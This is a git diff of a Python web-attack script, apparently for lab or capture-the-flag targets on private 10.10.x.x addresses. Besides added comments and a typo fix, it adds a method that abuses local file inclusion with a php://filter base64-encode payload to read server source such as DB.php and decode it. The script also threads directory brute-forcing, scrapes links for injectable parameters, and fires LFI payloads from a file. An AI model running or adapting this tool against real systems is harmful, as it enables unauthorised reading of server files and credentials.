@@ -9,9 +9,10 @@ from concurrent.futures import ThreadPoolExecutor
 from selenium import webdriver
 from colorama import Fore, Style, init
 import time
+import base64
 
-ip_1 = "10.10.248.85"
-ip_2 = "10.10.248.86"
+ip_1 = "10.10.143.101"
+ip_2 = "10.10.143.102"
 credentials = []
 services = []
 run_in_background = []
@@ -57,6 +58,7 @@ class WebFuzzing:
         self.stop_fuzzing = False
 
     def check_directory(self, url):
+        # Sends a HEAD request to check if the directory exists or is accessible
         try:
             response = httpx.head(url, verify=False, timeout=3)
             if response.status_code in [200, 301, 403]:
@@ -65,6 +67,7 @@ class WebFuzzing:
             pass
 
     def httpx_fuzzing(self):
+        # Directory fuzzing using httpx and threads. User can interrupt to move to next phase.
         if any(entry['port'] == '80' and entry['service'] == 'http' for entry in services):
             base_url = f"http://{self.ip}/"
         elif any(entry['port'] == '443' and entry['service'] == 'https' for entry in services):
@@ -75,6 +78,7 @@ class WebFuzzing:
 
         wordlist = "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
 
+        # Start a background thread to listen for user input to break fuzzing
         def wait_for_user():
             input("Press Enter at any time to proceed to the next phase...\n")
             self.stop_fuzzing = True
@@ -83,14 +87,16 @@ class WebFuzzing:
         try:
             with open(wordlist, 'r') as f:
                 dirs = [line.strip() for line in f]
-            with ThreadPoolExecutor(max_workers=self.thread_count) as executor: # due to ThreadPoolExecutor behviour some tasks (dir busting) will continue after breaking to the next phase
+            # ThreadPoolExecutor for concurrent directory checks
+            with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
                 for dirs_name in dirs:
                     if self.stop_fuzzing:
                         print("Proceeding to locating possible LFI's in found web pages")
                         break
                     url = base_url + dirs_name
                     executor.submit(self.check_directory, url)
-                    time.sleep(0.01)
+                    time.sleep(0.01)  # Small delay for responsiveness
+                # After user interrupts, shutdown threads and move to LFI phase
                 if self.stop_fuzzing:
                     executor.shutdown(wait=True)
                     self.locate_lfi('/dev') # testing, need to add ability to iterate through found webpages
@@ -98,6 +104,7 @@ class WebFuzzing:
             print(f"wordlist '{wordlist}' not found")
 
     def locate_lfi(self, web_page):
+        # Scrape links from the given web page and identify possible LFI parameters
         response = requests.get(f"http://{self.ip}/{web_page}")
         soup = BeautifulSoup(response.text, 'html.parser')
         links = soup.find_all("a")
@@ -110,12 +117,13 @@ class WebFuzzing:
         hrefs_df = pd.DataFrame({'Links': hrefs})
         print(Fore.GREEN + f"Links scraped of web page: {web_page}" + Style.RESET_ALL)
         print(hrefs_df)
-        
-        print(Fore.YELLOW + "Possible LFI Vulnerbility" + Style.RESET_ALL)
+
+        print(Fore.YELLOW + "Possible LFI Vulnerability" + Style.RESET_ALL)
         possible_lfi = set()
         for href in hrefs:
             if href and "?" in href:
-                param = href.split("?")[1].split("=")[0] # extract parameter name
+                # Extract parameter name from href
+                param = href.split("?")[1].split("=")[0]
                 base_url = href.split("=")[0]
                 full_url = f"http://{self.ip}{web_page}/{base_url}"
                 lfi_candidates.append({'url': full_url, 'href': href, 'Possible vulnerable parameter': param})
@@ -123,6 +131,7 @@ class WebFuzzing:
         print(lfi_df)
 
     def test_lfi(self, payload_file):
+        # Test each LFI candidate with payloads from the file
         negative = ['Failed opening']
         seen = set()
         with open(payload_file, 'r') as f:
@@ -133,12 +142,14 @@ class WebFuzzing:
                     param = candidate['Possible vulnerable parameter']
                     key = (url, param, payload)
                     if key in seen:
-                        continue
+                        continue  # Skip duplicate tests
                     seen.add(key)
                     response = requests.get(url, params={param: payload})
                     print(Fore.YELLOW + f"Testing For LFI vulnerability: {url}?{param}={payload}" + Style.RESET_ALL)
+                    # If negative string found, skip storing result
                     if any(neg in response.text for neg in negative):
                         continue
+                    # Extract LFI content from <p> tags
                     soup = BeautifulSoup(response.text, 'html.parser')
                     lfi_content = '\n'.join([tag.get_text() for tag in soup.find_all('p')])
                     if lfi_content:
@@ -147,8 +158,45 @@ class WebFuzzing:
                             "Content": lfi_content,
                             "Is Vulnerable": "Most Likely Vulnerable"
                         })
+        # Display results in a DataFrame for easy review
         lfi_results_df = pd.DataFrame(lfi_results)
         print(lfi_results_df)
+
+    def test_php_filter(self, payload):
+        base64_content = {
+            "Encoded": '',
+            "Decoded": ''
+        }
+        php_filters = {
+            "Filter and b64": "php://filter/convert.base64-encode/resource"
+        }
+        for candidate in lfi_candidates:
+            url = candidate["url"]
+            #testing url
+            #url = 'http://127.0.0.1/dev'
+            param = candidate["Possible vulnerable parameter"]
+            response = requests.get(url=url, params={param: f"{php_filters['Filter and b64']}={payload}"})
+            #try and extract base64 encoded content from the response
+            soupy_goodness = BeautifulSoup(response.text, 'html.parser')
+            # extract text from all <p> tags
+            for p_tag in soupy_goodness.find_all('p'):
+                text = p_tag.get_text().strip().replace('\n', '').replace('\r', '')
+                if len(text) > 100 and all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" for c in text):
+                    print("Base64 output detected (truncated):", text[:100])
+                    try:
+                        decoded = base64.b64decode(text).decode(errors='replace')
+                    except Exception as e:
+                        decoded = f"Decoding error: {e}"
+                    print(f"Decoded Base64 String (truncated): {decoded[:100]}")
+                    base64_content["Encoded"] = text
+                    base64_content["Decoded"] = decoded
+            
+
+class WebExploitation:
+    def __init__(self, ip):
+        self.ip = ip
+
+    # exploiting PHP filter
             
 
         
@@ -168,6 +216,7 @@ if __name__ == "__main__":
     test_lfi = WebFuzzing(ip_2, 1)
     test_lfi.locate_lfi('/dev')
     test_lfi.test_lfi('./lfi_payload')
+    test_lfi.test_php_filter('DB.php')
     
 
     
